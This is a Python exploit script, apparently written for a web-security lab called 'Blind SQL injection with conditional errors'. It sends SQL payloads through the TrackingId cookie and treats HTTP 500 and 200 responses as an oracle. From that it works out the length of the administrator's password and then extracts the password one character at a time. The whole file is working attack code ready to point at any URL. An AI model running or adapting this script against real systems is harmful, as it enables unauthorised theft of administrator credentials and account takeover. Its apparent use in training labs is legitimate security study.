import requests
import string
import sys
import urllib.parse
import getopt
from halo import Halo


def get_password_length(url, trackingId, session):
  password_length = 0
  i = 0

  while True:
    payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND LENGTH(password) > {i}) ||'"
    payload = urllib.parse.quote_plus(payload)
    cookies = {
      "TrackingId" :trackingId + payload,
      "session" :session
      }
    r = requests.get(url, cookies=cookies)

    if r.status_code == 200:
      break
    else:
      i += 1
      password_length += 1

  return password_length


def get_password(password_length, url, trackingId, session):
  characters = string.ascii_lowercase + string.digits
  password = ""
  message = "[-] The password for 'administrator' is: "
  print(message, end='', flush=True)

  for i in range(password_length):
    for x in characters:
      payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username = 'administrator' AND SUBSTR(password, {i + 1}, 1) = '{x}') ||'"
      payload = urllib.parse.quote_plus(payload)
      cookies = {
        "TrackingId": trackingId + payload,
        "session": session
        }
      r = requests.get(url, cookies=cookies)

      if r.status_code == 500:
        password += x
        print(x, end='', flush=True)
        break


  return f"[*] The password for 'administrator' is: {password}"


def get_cookie(url):
  session = requests.Session()
  if session.get(url).status_code != 200 :
    sys.exit("[!] Error. Status code is not '200'")

  response = session.get(url)
  cookies = session.cookies.get_dict()
  values = list(cookies.values())
  trackingId = values[0]
  session = values[1]

  return trackingId, session 


def main(argv):
  help_message = "This is the script for:\n'Blind SQL injection with conditional errors'\n\nUsage: python3 bsqli-2.py -u <url>"

  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print(help_message) 
    print("\x1b[?25h", end="") # Make cursor visible 
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
      trackingId, session = get_cookie(url)
    elif opt == "-h":
      print(help_message) 
      print("\x1b[?25h", end="") # Make cursor visible 
      sys.exit()

  password_length = get_password_length(url, trackingId, session)
  password = get_password(password_length, url, trackingId, session)
  print(password)


if __name__ == "__main__":
  print("\x1b[?25l") # Hide cursor
  main(sys.argv[1:])
  print("\x1b[?25h") # Make cursor visible
  sys.exit()